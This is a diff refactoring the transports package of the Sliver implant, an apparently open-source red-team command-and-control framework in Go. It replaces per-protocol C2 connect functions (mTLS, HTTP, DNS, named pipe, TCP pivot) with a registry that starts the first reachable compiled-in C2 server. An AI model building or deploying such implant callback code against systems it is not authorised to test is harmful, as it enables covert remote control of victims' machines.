@@ -19,32 +19,17 @@ package transports
 */
 
 import (
-
-	// {{if or .Config.HTTPc2Enabled .Config.TCPPivotc2Enabled}}
-	"net"
-	// {{end}}
-
 	// {{if .Config.Debug}}
 	"log"
 	// {{end}}
 
-	"crypto/x509"
-	"io"
+	"crypto/rand"
+	"encoding/binary"
+	"errors"
 	"net/url"
-	"os"
 	"strconv"
 	"sync"
 	"time"
-
-	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
-
-	// {{if .Config.HTTPc2Enabled}}
-	"github.com/golang/protobuf/proto"
-	// {{end}}
-
-	// {{if .Config.TCPPivotc2Enabled}}
-	"strings"
-	// {{end}}
 )
 
 var (
@@ -58,198 +43,140 @@ var (
 
 	ccCounter = new(int)
 
-	activeC2         string
-	activeConnection *Connection
+	// All server URLs compiled in the implant. For now this also determines
+	// which transport stacks are available...
+	ccServers = []string{
+		// {{range $index, $value := .Config.C2}}
+		"{{$value}}", // {{$index}}
+		// {{end}}
+	}
 )
 
-// Connection - Abstract connection to the server
-type Connection struct {
-	Send    chan *pb.Envelope
-	Recv    chan *pb.Envelope
-	IsOpen  bool
-	ctrl    chan bool
-	cleanup func()
-	once    *sync.Once
-	tunnels *map[uint64]*Tunnel
-	mutex   *sync.RWMutex
+var (
+	// Transports - All active transports on this implant.
+	Transports = &transports{
+		Available: map[uint64]*Transport{},
+		CommID:    make(chan uint64),
+		mutex:     &sync.Mutex{},
+	}
+)
+
+// transports - Holds all active transports for this implant.
+// This is consumed by some handlers & listeners, as well as the routing system.
+type transports struct {
+	Available map[uint64]*Transport // All transports available (compiled in) to this implant
+	Server    *Transport            // The transport tied to the C2 server (active connection)
+
+	// CommID - A blocking channel over which a transport receives a tunnel ID.
+	// This ID is sent by the server/pivots after implant has registered its C2 Session,
+	// and is the ID of the tunnel we'll use to setup Comms.
+	CommID chan uint64
+	mutex  *sync.Mutex
 }
 
-// Cleanup - Execute cleanup once
-func (c *Connection) Cleanup() {
-	c.once.Do(func() {
-		c.cleanup()
-		c.IsOpen = false
-	})
-}
+// Init - Parses all available transport strings and registers them as available transports.
+// Then starts the first transport in the list, for reaching back to the server.
+func (t *transports) Init() (err error) {
 
-// Tunnel - Duplex byte read/write
-type Tunnel struct {
-	ID uint64
-
-	Reader       io.ReadCloser
-	ReadSequence uint64
-
-	Writer        io.WriteCloser
-	WriteSequence uint64
-}
-
-// Tunnel - Add tunnel to mapping
-func (c *Connection) Tunnel(ID uint64) *Tunnel {
-	c.mutex.RLock()
-	defer c.mutex.RUnlock()
-	return (*c.tunnels)[ID]
-}
-
-// AddTunnel - Add tunnel to mapping
-func (c *Connection) AddTunnel(tun *Tunnel) {
-	c.mutex.Lock()
-	defer c.mutex.Unlock()
-
-	(*c.tunnels)[tun.ID] = tun
-}
-
-// RemoveTunnel - Add tunnel to mapping
-func (c *Connection) RemoveTunnel(ID uint64) {
-	c.mutex.Lock()
-	defer c.mutex.Unlock()
-	delete(*c.tunnels, ID)
-}
-
-// StartConnectionLoop - Starts the main connection loop
-func StartConnectionLoop() *Connection {
+	// Register all transports
+	for _, addr := range ccServers {
+		uri, err := url.Parse(addr)
+		if err != nil {
+			continue
+		}
+		transport, _ := newTransport(uri)
+		t.Add(transport)
+	}
+	if len(t.Available) == 0 {
+		return errors.New("no available transports")
+	}
 
 	// {{if .Config.Debug}}
 	log.Printf("Starting connection loop ...")
 	// {{end}}
 
-	connectionAttempts := 0
-	for connectionAttempts < maxErrors {
+	// Then start the first transport, with fallback if failure
+	for _, tp := range t.Available {
 
-		var connection *Connection
-		var err error
+		// This automatically performs Comm init and Session registration.
+		err = tp.Start(false)
 
-		uri := nextCCServer()
-		// {{if .Config.Debug}}
-		log.Printf("Next CC = %s", uri.String())
-		// {{end}}
-
-		switch uri.Scheme {
-
-		// *** MTLS ***
-		// {{if .Config.MTLSc2Enabled}}
-		case "mtls":
-			transport, err := newTransportMTLS(uri)
-			if err == nil {
-				return transport.C2
-
-			}
-			// {{if .Config.Debug}}
-			log.Printf("[mtls] Connection failed %s", err)
-			// {{end}}
-			// {{end}}  - MTLSc2Enabled
-
-		case "https":
-			fallthrough
-		case "http":
-			// *** HTTP ***
-			// {{if .Config.HTTPc2Enabled}}
-			connection, err = httpConnect(uri)
-			if err == nil {
-				activeC2 = uri.String()
-				activeConnection = connection
-				return connection
-			}
-			// {{if .Config.Debug}}
-			log.Printf("[%s] Connection failed %s", uri.Scheme, err)
-			// {{end}}
-			connectionAttempts++
-			// {{end}} - HTTPc2Enabled
-
-		case "dns":
-			// *** DNS ***
-			// {{if .Config.DNSc2Enabled}}
-			connection, err = dnsConnect(uri)
-			if err == nil {
-				activeC2 = uri.String()
-				activeConnection = connection
-				return connection
-			}
-			// {{if .Config.Debug}}
-			log.Printf("[dns] Connection failed %s", err)
-			// {{end}}
-			connectionAttempts++
-			// {{end}} - DNSc2Enabled
-
-		case "namedpipe":
-			// *** Named Pipe ***
-			// {{if .Config.NamePipec2Enabled}}
-			connection, err = namedPipeConnect(uri)
-			if err == nil {
-				activeC2 = uri.String()
-				activeConnection = connection
-				return connection
-			}
-			// {{if .Config.Debug}}
-			log.Printf("[namedpipe] Connection failed %s", err)
-			// {{end}}
-			connectionAttempts++
-			// {{end}} -NamePipec2Enabled
-
-		case "tcppivot":
-			// {{if .Config.TCPPivotc2Enabled}}
-			connection, err = tcpPivotConnect(uri)
-			if err == nil {
-				activeC2 = uri.String()
-				activeConnection = connection
-				return connection
-			}
-			// {{if .Config.Debug}}
-			log.Printf("[tcppivot] Connection failed %s", err)
-			// {{end}}
-			connectionAttempts++
-			// {{end}} -TCPPivotc2Enabled
-
-		default:
-			// {{if .Config.Debug}}
-			log.Printf("Unknown c2 protocol %s", uri.Scheme)
-			// {{end}}
+		// Assign it as the Active C2 as well.
+		if err == nil {
+			t.Server = tp
+			return
 		}
 
-		// {{if .Config.Debug}}
-		log.Printf("Sleep %d second(s) ...", reconnectInterval/time.Second)
-		// {{end}}
+		// Wait if this transport failed.
 		time.Sleep(reconnectInterval)
 	}
-	// {{if .Config.Debug}}
-	log.Printf("[!] Max connection errors reached\n")
-	// {{end}}
 
-	return nil
+	return errors.New("Failed to start one of the available transports")
 }
 
-var ccServers = []string{
-	// {{range $index, $value := .Config.C2}}
-	"{{$value}}", // {{$index}}
-	// {{end}}
+// Add - Add a new active transport to the implant' transport map.
+func (t *transports) Add(tp *Transport) (err error) {
+	t.mutex.Lock()
+	t.Available[tp.ID] = tp
+	t.mutex.Unlock()
+	return
 }
+
+// Remove - A transport has terminated its connection, and we remove it.
+func (t *transports) Remove(ID uint64) (err error) {
+	t.mutex.Lock()
+	delete(t.Available, ID)
+	t.mutex.Unlock()
+	return
+}
+
+// Get - Returns an active Transport given an ID.
+func (t *transports) Get(ID uint64) (tp *Transport) {
+	tp, _ = t.Available[ID]
+	return
+}
+
+// Switch - Dynamically switch the active transport, if multiple are available.
+func (t *transports) Switch(ID uint64, force bool) (err error) {
+
+	// Everything in the transport is set up and running, including RPC layer.
+	// We now either send a registration envelope, or anything.
+	// activeConnection = t.C2
+	// activeC2 = t.URL.String()
+
+	// t.Server = t // The transport tied to the server
+	return
+}
+
+func newID() uint64 {
+	randBuf := make([]byte, 8)
+	rand.Read(randBuf)
+	return binary.LittleEndian.Uint64(randBuf)
+}
+
+// Sould not be needed anymore, or translated for transports.
+// func nextCCServer() *url.URL {
+//         uri, err := url.Parse(ccServers[*ccCounter%len(ccServers)])
+//         *ccCounter++
+//         if err != nil {
+//                 return nextCCServer()
+//         }
+//         return uri
+// }
 
 // GetActiveC2 returns the URL of the C2 in use
 func GetActiveC2() string {
-	return activeC2
+	return Transports.Server.URL.String()
 }
 
 // GetActiveConnection returns the Connection of the C2 in use
 func GetActiveConnection() *Connection {
-	return activeConnection
+	return Transports.Server.C2
 }
 
-func nextCCServer() *url.URL {
-	uri, err := url.Parse(ccServers[*ccCounter%len(ccServers)])
-	*ccCounter++
-	if err != nil {
-		return nextCCServer()
-	}
-	return uri
+// GetImplantPrivateKey returns the private key used for comm descryption.
+func GetImplantPrivateKey() []byte {
+	return []byte(keyPEM)
 }
 
 func GetReconnectInterval() time.Duration {
@@ -266,367 +193,4 @@ func getMaxConnectionErrors() int {
 		return 1000
 	}
 	return maxConnectionErrors
-}
-
-// {{if .Config.MTLSc2Enabled}}
-func mtlsConnect(uri *url.URL) (*Connection, error) {
-	// {{if .Config.Debug}}
-	log.Printf("Connecting -> %s", uri.Host)
-	// {{end}}
-	lport, err := strconv.Atoi(uri.Port())
-	if err != nil {
-		lport = 8888
-	}
-	conn, err := tlsConnect(uri.Hostname(), uint16(lport))
-	if err != nil {
-		return nil, err
-	}
-
-	send := make(chan *pb.Envelope)
-	recv := make(chan *pb.Envelope)
-	ctrl := make(chan bool)
-	connection := &Connection{
-		Send:    send,
-		Recv:    recv,
-		ctrl:    ctrl,
-		tunnels: &map[uint64]*Tunnel{},
-		mutex:   &sync.RWMutex{},
-		once:    &sync.Once{},
-		IsOpen:  true,
-		cleanup: func() {
-			// {{if .Config.Debug}}
-			log.Printf("[mtls] lost connection, cleanup...")
-			// {{end}}
-			close(send)
-			conn.Close()
-			close(recv)
-		},
-	}
-
-	go func() {
-		defer connection.Cleanup()
-		for envelope := range send {
-			socketWriteEnvelope(conn, envelope)
-		}
-	}()
-
-	go func() {
-		defer connection.Cleanup()
-		for {
-			envelope, err := socketReadEnvelope(conn)
-			if err == io.EOF {
-				break
-			}
-			if err == nil {
-				recv <- envelope
-			}
-		}
-	}()
-
-	activeConnection = connection
-	return connection, nil
-}
-
-// {{end}} -MTLSc2Enabled
-
-// {{if .Config.HTTPc2Enabled}}
-func httpConnect(uri *url.URL) (*Connection, error) {
-
-	// {{if .Config.Debug}}
-	log.Printf("Connecting -> http(s)://%s", uri.Host)
-	// {{end}}
-	client, err := HTTPStartSession(uri.Host)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("http(s) connection error %v", err)
-		// {{end}}
-		return nil, err
-	}
-
-	send := make(chan *pb.Envelope)
-	recv := make(chan *pb.Envelope)
-	ctrl := make(chan bool, 1)
-	connection := &Connection{
-		Send:    send,
-		Recv:    recv,
-		ctrl:    ctrl,
-		tunnels: &map[uint64]*Tunnel{},
-		mutex:   &sync.RWMutex{},
-		once:    &sync.Once{},
-		IsOpen:  true,
-		cleanup: func() {
-			// {{if .Config.Debug}}
-			log.Printf("[http] lost connection, cleanup...")
-			// {{end}}
-			close(send)
-			ctrl <- true
-			close(recv)
-		},
-	}
-
-	go func() {
-		defer connection.Cleanup()
-		for envelope := range send {
-			data, _ := proto.Marshal(envelope)
-			// {{if .Config.Debug}}
-			log.Printf("[http] send envelope ...")
-			// {{end}}
-			go client.Send(data)
-		}
-	}()
-
-	go func() {
-		defer connection.Cleanup()
-		for {
-			select {
-			case <-ctrl:
-				return
-			default:
-				resp, err := client.Poll()
-				switch err := err.(type) {
-				case nil:
-					envelope := &pb.Envelope{}
-					proto.Unmarshal(resp, envelope)
-					if err != nil {
-						continue
-					}
-					recv <- envelope
-				case net.Error:
-					if err.Timeout() {
-						// {{if .Config.Debug}}
-						log.Printf("non-fatal error, continue")
-						// {{end}}
-						continue
-					}
-					return
-				case *url.Error:
-					if err, ok := err.Err.(net.Error); ok && err.Timeout() {
-						// {{if .Config.Debug}}
-						log.Printf("non-fatal error, continue")
-						// {{end}}
-						continue
-					}
-					return
-				default:
-					// {{if .Config.Debug}}
-					log.Printf("[http] error: %#v", err)
-					// {{end}}
-					return
-				}
-			}
-		}
-	}()
-
-	activeConnection = connection
-	return connection, nil
-}
-
-// {{end}} -HTTPc2Enabled
-
-// {{if .Config.DNSc2Enabled}}
-func dnsConnect(uri *url.URL) (*Connection, error) {
-	dnsParent := uri.Hostname()
-	// {{if .Config.Debug}}
-	log.Printf("Attempting to connect via DNS via parent: %s\n", dnsParent)
-	// {{end}}
-	sessionID, sessionKey, err := dnsStartSession(dnsParent)
-	if err != nil {
-		return nil, err
-	}
-	// {{if .Config.Debug}}
-	log.Printf("Starting new session with id = %s\n", sessionID)
-	// {{end}}
-
-	send := make(chan *pb.Envelope)
-	recv := make(chan *pb.Envelope)
-	ctrl := make(chan bool, 1)
-	connection := &Connection{
-		Send:    send,
-		Recv:    recv,
-		ctrl:    ctrl,
-		tunnels: &map[uint64]*Tunnel{},
-		mutex:   &sync.RWMutex{},
-		once:    &sync.Once{},
-		IsOpen:  true,
-		cleanup: func() {
-			// {{if .Config.Debug}}
-			log.Printf("[dns] lost connection, cleanup...")
-			// {{end}}
-			close(send)
-			ctrl <- true // Stop polling
-			close(recv)
-		},
-	}
-
-	go func() {
-		defer connection.Cleanup()
-		for envelope := range send {
-			dnsSessionSendEnvelope(dnsParent, sessionID, sessionKey, envelope)
-		}
-	}()
-
-	go func() {
-		defer connection.Cleanup()
-		dnsSessionPoll(dnsParent, sessionID, sessionKey, ctrl, recv)
-	}()
-
-	activeConnection = connection
-	return connection, nil
-}
-
-// {{end}} - .DNSc2Enabled
-
-// {{if .Config.NamePipec2Enabled}}
-func namedPipeConnect(uri *url.URL) (*Connection, error) {
-	conn, err := namePipeDial(uri)
-	if err != nil {
-		return nil, err
-	}
-	send := make(chan *pb.Envelope)
-	recv := make(chan *pb.Envelope)
-	ctrl := make(chan bool, 1)
-	connection := &Connection{
-		Send:    send,
-		Recv:    recv,
-		ctrl:    ctrl,
-		tunnels: &map[uint64]*Tunnel{},
-		mutex:   &sync.RWMutex{},
-		once:    &sync.Once{},
-		IsOpen:  true,
-		cleanup: func() {
-			// {{if .Config.Debug}}
-			log.Printf("[namedpipe] lost connection, cleanup...")
-			// {{end}}
-			close(send)
-			ctrl <- true
-			close(recv)
-		},
-	}
-
-	go func() {
-		defer connection.Cleanup()
-		for envelope := range send {
-			// {{if .Config.Debug}}
-			log.Printf("[namedpipe] send loop envelope type %d\n", envelope.Type)
-			// {{end}}
-			namedPipeWriteEnvelope(&conn, envelope)
-		}
-	}()
-
-	go func() {
-		defer connection.Cleanup()
-		for {
-			envelope, err := namedPipeReadEnvelope(&conn)
-			if err == io.EOF {
-				break
-			}
-			if err == nil {
-				recv <- envelope
-				// {{if .Config.Debug}}
-				log.Printf("[namedpipe] Receive loop envelope type %d\n", envelope.Type)
-				// {{end}}
-			}
-		}
-	}()
-	activeConnection = connection
-	return connection, nil
-}
-
-// {{end}} -NamePipec2Enabled
-
-// {{if .Config.TCPPivotc2Enabled}}
-func tcpPivotConnect(uri *url.URL) (*Connection, error) {
-	addr := strings.ReplaceAll(uri.String(), "tcppivot://", "")
-	conn, err := net.Dial("tcp", addr)
-	if err != nil {
-		return nil, err
-	}
-	send := make(chan *pb.Envelope)
-	recv := make(chan *pb.Envelope)
-	ctrl := make(chan bool, 1)
-	connection := &Connection{
-		Send:    send,
-		Recv:    recv,
-		ctrl:    ctrl,
-		tunnels: &map[uint64]*Tunnel{},
-		mutex:   &sync.RWMutex{},
-		once:    &sync.Once{},
-		IsOpen:  true,
-		cleanup: func() {
-			// {{if .Config.Debug}}
-			log.Printf("[tcp-pivot] lost connection, cleanup...")
-			// {{end}}
-			close(send)
-			ctrl <- true
-			close(recv)
-		},
-	}
-
-	go func() {
-		defer connection.Cleanup()
-		for envelope := range send {
-			// {{if .Config.Debug}}
-			log.Printf("[tcp-pivot] send loop envelope type %d\n", envelope.Type)
-			// {{end}}
-			tcpPivoteWriteEnvelope(&conn, envelope)
-		}
-	}()
-
-	go func() {
-		defer connection.Cleanup()
-		for {
-			envelope, err := tcpPivotReadEnvelope(&conn)
-			if err == io.EOF {
-				break
-			}
-			if err == nil {
-				recv <- envelope
-				// {{if .Config.Debug}}
-				log.Printf("[tcp-pivot] Receive loop envelope type %d\n", envelope.Type)
-				// {{end}}
-			}
-		}
-	}()
-	activeConnection = connection
-	return connection, nil
-}
-
-// {{end}} -TCPPivotc2Enabled
-
-// rootOnlyVerifyCertificate - Go doesn't provide a method for only skipping hostname validation so
-// we have to disable all of the fucking certificate validation and re-implement everything.
-// https://github.com/golang/go/issues/21971
-func rootOnlyVerifyCertificate(rawCerts [][]byte, _ [][]*x509.Certificate) error {
-
-	roots := x509.NewCertPool()
-	ok := roots.AppendCertsFromPEM([]byte(caCertPEM))
-	if !ok {
-		// {{if .Config.Debug}}
-		log.Printf("Failed to parse root certificate")
-		// {{end}}
-		os.Exit(3)
-	}
-
-	cert, err := x509.ParseCertificate(rawCerts[0]) // We should only get one cert
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("Failed to parse certificate: " + err.Error())
-		// {{end}}
-		return err
-	}
-
-	// Basically we only care if the certificate was signed by our authority
-	// Go selects sensible defaults for time and EKU, basically we're only
-	// skipping the hostname check, I think?
-	options := x509.VerifyOptions{
-		Roots: roots,
-	}
-	if _, err := cert.Verify(options); err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("Failed to verify certificate: " + err.Error())
-		// {{end}}
-		return err
-	}
-
-	return nil
 }
